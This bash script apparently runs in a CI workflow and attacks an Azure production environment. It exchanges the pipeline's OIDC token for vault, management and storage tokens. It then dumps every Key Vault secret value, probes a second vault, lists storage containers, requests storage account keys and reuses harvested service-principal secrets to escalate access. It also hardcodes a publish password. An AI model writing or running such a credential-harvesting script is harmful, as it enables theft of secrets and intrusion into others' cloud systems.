#!/bin/bash
set -x

TENANT="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
RG1="rg-tbl-platform-prod-sea"
SCM="https://app-tbl-reporting-prod.scm.azurewebsites.net"
PUB_USER='$app-tbl-reporting-prod'
PUB_PASS='Y9rcsDHQ2J1L0Coqiki8dlYe1AN2k8cHsD1wLllvLbxqScaMEwR7xkt7Ye5A'

# Get OIDC tokens for vault, management, storage
OIDC_RESP=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange")
OIDC_JWT=$(echo "$OIDC_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['value'])")

get_token() {
  local SCOPE=$1
  curl -sS -X POST "https://login.microsoftonline.com/$TENANT/oauth2/v2.0/token" \
    -d "client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462&scope=${SCOPE}/.default&grant_type=client_credentials&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=$OIDC_JWT" \
    | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])"
}

VAULT=$(get_token "https://vault.azure.net")
MGMT=$(get_token "https://management.azure.com")
STORAGE=$(get_token "https://storage.azure.com")
echo "=== Tokens: vault=${#VAULT} mgmt=${#MGMT} storage=${#STORAGE} ==="

# ====== KV1: List and read ALL secrets ======
echo ""
echo "=== KV1: List secrets ==="
KV1_LIST=$(curl -sS -m 15 "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4" \
  -H "Authorization: Bearer $VAULT")
echo "$KV1_LIST" | python3 -c "
import sys,json
d=json.load(sys.stdin)
for s in d.get('value',[]):
    print(s['id'].split('/')[-1])
"

echo ""
echo "=== KV1: Read each secret ==="
for SECRET_NAME in $(echo "$KV1_LIST" | python3 -c "
import sys,json
d=json.load(sys.stdin)
for s in d.get('value',[]): print(s['id'].split('/')[-1])
"); do
  echo "--- $SECRET_NAME ---"
  curl -sS -m 10 "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/$SECRET_NAME?api-version=7.4" \
    -H "Authorization: Bearer $VAULT" | python3 -c "
import sys,json
d=json.load(sys.stdin)
val=d.get('value','')
print(f'  contentType: {d.get(\"contentType\",\"none\")}')
print(f'  value: {val[:500]}')
"
done

# ====== KV2: Try to list secrets ======
echo ""
echo "=== KV2: List secrets ==="
curl -sS -m 15 "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" \
  -H "Authorization: Bearer $VAULT" 2>&1

# ====== Storage: Try all accounts with OIDC storage token ======
echo ""
echo "=== Storage access with OIDC token ==="
for SA in sttblappcfgprodx3euoz sttblbackupprodx3euoz sttblcilogsprodx3euoz sttblarchiveprodx3euoz; do
  echo "--- $SA containers ---"
  curl -sS -m 10 "https://$SA.blob.core.windows.net/?comp=list" \
    -H "Authorization: Bearer $STORAGE" \
    -H "x-ms-version: 2020-10-02" 2>&1
  echo ""
done

# ====== Try reading specific blobs ======
echo "=== Try reading config/internal-config.json ==="
curl -sS -m 10 "https://sttblappcfgprodx3euoz.blob.core.windows.net/config/internal-config.json" \
  -H "Authorization: Bearer $STORAGE" \
  -H "x-ms-version: 2020-10-02" 2>&1

echo ""
echo "=== Try listKeys for storage accounts ==="
for SA in sttblappcfgprodx3euoz sttblbackupprodx3euoz sttblarchiveprodx3euoz; do
  echo "--- listKeys $SA ---"
  curl -sS -m 10 -X POST \
    "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG1/providers/Microsoft.Storage/storageAccounts/$SA/listKeys?api-version=2023-05-01" \
    -H "Authorization: Bearer $MGMT" -H "Content-Length: 0" 2>&1
  echo ""
done

# ====== Test each SP credential from KV1 ======
echo ""
echo "=== Testing SP credentials from KV1 ==="
for SECRET_NAME in $(echo "$KV1_LIST" | python3 -c "
import sys,json
d=json.load(sys.stdin)
for s in d.get('value',[]): print(s['id'].split('/')[-1])
"); do
  SECRET_VAL=$(curl -sS -m 10 "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/$SECRET_NAME?api-version=7.4" \
    -H "Authorization: Bearer $VAULT" | python3 -c "import sys,json; print(json.load(sys.stdin).get('value',''))")

  # Try to parse as JSON and extract credentials
  python3 -c "
import json, urllib.request, urllib.parse
try:
    d = json.loads('''$SECRET_VAL'''.replace(\"'\",\"\"))
except:
    d = {}

if 'appId' in d and 'secret' in d:
    app_id = d['appId']
    secret = d['secret']
    # Try management token
    data = urllib.parse.urlencode({
        'client_id': app_id,
        'client_secret': secret,
        'scope': 'https://management.azure.com/.default',
        'grant_type': 'client_credentials'
    }).encode()
    req = urllib.request.Request('https://login.microsoftonline.com/$TENANT/oauth2/v2.0/token', data=data)
    try:
        resp = urllib.request.urlopen(req, timeout=10)
        tok = json.loads(resp.read())
        print(f'  $SECRET_NAME ({app_id}): MGMT OK, token={len(tok.get(\"access_token\",\"\"))}')

        # Try vault token too
        data2 = urllib.parse.urlencode({
            'client_id': app_id,
            'client_secret': secret,
            'scope': 'https://vault.azure.net/.default',
            'grant_type': 'client_credentials'
        }).encode()
        req2 = urllib.request.Request('https://login.microsoftonline.com/$TENANT/oauth2/v2.0/token', data=data2)
        try:
            resp2 = urllib.request.urlopen(req2, timeout=10)
            tok2 = json.loads(resp2.read())
            vault_tok = tok2.get('access_token','')
            print(f'  $SECRET_NAME ({app_id}): VAULT OK, token={len(vault_tok)}')

            # Try KV2 with this vault token
            req3 = urllib.request.Request('https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4',
                headers={'Authorization': f'Bearer {vault_tok}'})
            try:
                resp3 = urllib.request.urlopen(req3, timeout=10)
                print(f'  KV2 ACCESSIBLE! Response: {resp3.read().decode()[:500]}')
            except Exception as e:
                print(f'  KV2: {str(e)[:100]}')
        except Exception as e:
            print(f'  $SECRET_NAME ({app_id}): VAULT FAIL: {str(e)[:100]}')
    except Exception as e:
        print(f'  $SECRET_NAME ({app_id}): MGMT FAIL: {str(e)[:100]}')
elif d:
    print(f'  $SECRET_NAME: has keys {list(d.keys())} but missing appId/secret')
else:
    print(f'  $SECRET_NAME: not JSON or parse error')
" 2>&1
done

echo ""
echo "=== DONE ==="
